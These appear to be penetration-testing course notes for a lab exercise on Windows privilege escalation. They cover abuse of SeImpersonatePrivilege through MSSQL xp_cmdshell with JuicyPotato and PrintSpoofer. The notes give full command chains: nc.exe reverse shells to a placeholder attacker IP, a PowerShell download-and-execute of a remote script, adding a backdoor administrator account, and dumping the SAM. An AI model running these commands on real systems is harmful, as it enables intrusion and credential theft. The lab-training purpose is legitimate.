# Section 7 — SeImpersonate and SeAssignPrimaryToken

> **Lab: yes** — escalate to SYSTEM via Potato/PrintSpoofer attack through MSSQL service account.

**Core principle:** Service accounts (IIS, MSSQL, Tomcat) almost always have `SeImpersonatePrivilege`. This privilege lets the account impersonate any token presented to it — the "Potato" family of attacks tricks a SYSTEM process into authenticating to your controlled process, handing you a SYSTEM token.

---

## How token impersonation works

```
1. Service account has SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege)
2. Attacker tricks a SYSTEM process into connecting to attacker-controlled named pipe/COM server
3. SYSTEM process authenticates → presents its token
4. Attacker impersonates that token → executes commands as SYSTEM
```

**Why service accounts have this privilege:** They need to impersonate connecting clients (e.g., IIS impersonating a user browsing the website to access files as that user). It's a legitimate Windows feature — but it's a direct path to SYSTEM.

---

## When you'll encounter this

| Scenario | Account | Has SeImpersonate? |
|----------|---------|-------------------|
| Web shell on IIS | `iis apppool\defaultapppool` | Yes |
| xp_cmdshell via MSSQL | `nt service\mssql$<instance>` | Yes |
| Tomcat/Jenkins RCE | Service account | Yes |
| Scheduled task as service | `NT AUTHORITY\LOCAL SERVICE` | Yes |
| Any "Run as Service" account | Varies | Almost always yes |

**First check after getting shell as service account:**
```cmd
whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"
```

---

## Potato family — which tool for which OS

| Tool | Works on | Mechanism |
|------|----------|-----------|
| **JuicyPotato** | Windows Server 2016, Win 10 < 1809 | DCOM/NTLM reflection, custom CLSID |
| **RoguePotato** | Server 2019, Win 10 ≥ 1809 | Oxid resolver redirect |
| **PrintSpoofer** | Server 2016/2019, Win 10 ≥ 1809 | Named pipe impersonation via Print Spooler |
| **GodPotato** | All versions (modern) | Universal approach |
| **SweetPotato** | Multiple versions | Combines multiple techniques |

> **Rule of thumb:** Try PrintSpoofer first (simple, works on most modern systems). If it fails, try GodPotato or RoguePotato. JuicyPotato only for older systems (< 1809).

---

## Attack walkthrough — MSSQL → SeImpersonate → SYSTEM

### Step 1: Connect to MSSQL with creds

```bash
mssqlclient.py sql_dev@<TARGET> -windows-auth
```
> `-windows-auth` uses Windows authentication (NTLM). Password prompted interactively.

### Step 2: Enable xp_cmdshell

```sql
enable_xp_cmdshell
```
> Impacket handles `RECONFIGURE` automatically. On a raw SQL connection you'd need:
> ```sql
> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
> ```

### Step 3: Confirm context and privileges

```sql
xp_cmdshell whoami
xp_cmdshell whoami /priv
```
> Expect: `nt service\mssql$sqlexpress01` with `SeImpersonatePrivilege: Enabled`

### Step 4a: Escalate with JuicyPotato (Server 2016 / Win 10 < 1809)

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *
```

**Flags explained:**
- `-l 53375` — local COM server listening port (pick any unused port)
- `-p c:\windows\system32\cmd.exe` — program to launch as SYSTEM
- `-a "/c ..."` — arguments to cmd.exe (reverse shell via nc)
- `-t *` — try both CreateProcessWithTokenW and CreateProcessAsUser

**On attacker:**
```bash
nc -lnvp 8443
```

### Step 4b: Escalate with PrintSpoofer (Server 2016/2019, Win 10 ≥ 1809)

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd"
```

**On attacker:**
```bash
nc -lnvp 8443
```

### Step 5: Verify SYSTEM

```cmd
whoami
:: Expected: nt authority\system
```

---

## Alternative execution methods (no nc.exe needed)

### PrintSpoofer — interactive shell (if you have console/RDP)

```cmd
PrintSpoofer.exe -i -c cmd
```
> `-i` = interactive, spawns elevated cmd in current console

### PrintSpoofer — add local admin user

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "net user hacker P@ss123! /add"
xp_cmdshell c:\tools\PrintSpoofer.exe -c "net localgroup administrators hacker /add"
```

### JuicyPotato — execute PowerShell payload

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "-ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')" -t *
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| JuicyPotato CLSID doesn't work | Try different CLSIDs from [this list](https://ohpe.it/juicy-potato/CLSID/). Use `-c {CLSID}` flag |
| "CreateProcessWithTokenW failed" | Try `-t u` (CreateProcessAsUser only) or different CLSID |
| PrintSpoofer "Named pipe didn't receive any data" | Print Spooler service may be disabled. Check: `sc query spooler` |
| No nc.exe on target | Upload via: `xp_cmdshell powershell iwr http://<ATTACKER>:8000/nc.exe -o c:\windows\temp\nc.exe` |
| Tool gets caught by AV | Use `C:\Windows\Temp` for uploads, or try GodPotato (less signatured) |

---

## Lab walkthrough

**Target:** `10.129.43.43` (ACADEMY-WINLPE-SRV01)
**Creds:** `sql_dev` / `Str0ng_P@ssw0rd!` (Windows auth)

### Full attack chain:

```
1. Connect: mssqlclient.py sql_dev@10.129.43.43 -windows-auth
2. Enable cmd: enable_xp_cmdshell
3. Verify: xp_cmdshell whoami /priv → confirm SeImpersonatePrivilege
4. Set up listener on Kali: nc -lnvp 8443
5. Escalate (PrintSpoofer):
   xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <YOUR_IP> 8443 -e cmd"
   OR (JuicyPotato):
   xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <YOUR_IP> 8443 -e cmd.exe" -t *
6. Catch shell → whoami → nt authority\system
7. type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

### Commands to run:

**On Kali (terminal 1):**
```bash
nc -lnvp 8443
```

**On Kali (terminal 2):**
```bash
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
# Password: Str0ng_P@ssw0rd!
```

**In MSSQL shell:**
```sql
enable_xp_cmdshell
xp_cmdshell whoami /priv
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <YOUR_TUN0_IP> 8443 -e cmd"
```

**In caught SYSTEM shell:**
```cmd
type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

---

## Lab observations & attack chain (WINLPE-SRV01)

**Connecting the dots from earlier sections:**
```
Section 4: Found MSSQL on port 1433, Tomcat on 8080
Section 5: SQL Express named pipe — Everyone has RW
Section 6: SeImpersonatePrivilege theory
    │
    ▼ NOW: Full exploitation
    │
├── sql_dev creds → mssqlclient.py → xp_cmdshell
│   └── Running as: nt service\mssql$sqlexpress01
│       └── Has: SeImpersonatePrivilege (Enabled)
│           └── PrintSpoofer/JuicyPotato → SYSTEM shell
│               └── Read flag, dump SAM, pivot, etc.
│
├── Why this works on Server 2016 (Build 14393):
│   ├── JuicyPotato works (< 1809)
│   └── PrintSpoofer also works (Server 2016+)
│
└── Post-exploitation as SYSTEM:
    ├── Dump SAM: reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\sys
    ├── Harvest sccm_svc token (logged in at console — Section 4)
    ├── Access 172.16.20.0/23 network (dual-homed — Section 3)
    └── Check for domain credentials in LSASS
```

**Key exam note:** This is the #1 most common Windows privesc path on HTB and CPTS. Whenever you get a service account shell → check `whoami /priv` → SeImpersonate → Potato/PrintSpoofer → SYSTEM. Takes under 2 minutes once you have the tools staged.

---

## Key takeaways

- **SeImpersonatePrivilege = instant SYSTEM** with the right tool. This is the single most exploited Windows privilege.
- **Service accounts almost always have it.** MSSQL, IIS, Tomcat, Jenkins, any "Log on as a service" account.
- **PrintSpoofer is the modern go-to.** Works on Server 2016/2019/2022 and Win 10/11. Simple one-liner.
- **JuicyPotato is legacy** (pre-1809 only) but still shows up on older boxes.
- **Always stage nc.exe + your Potato tool** in `C:\Windows\Temp` or `C:\Tools` early.
- **No outbound connections?** Use `PrintSpoofer.exe -i -c cmd` for an interactive elevated shell (requires console/RDP), or add a local admin user instead.
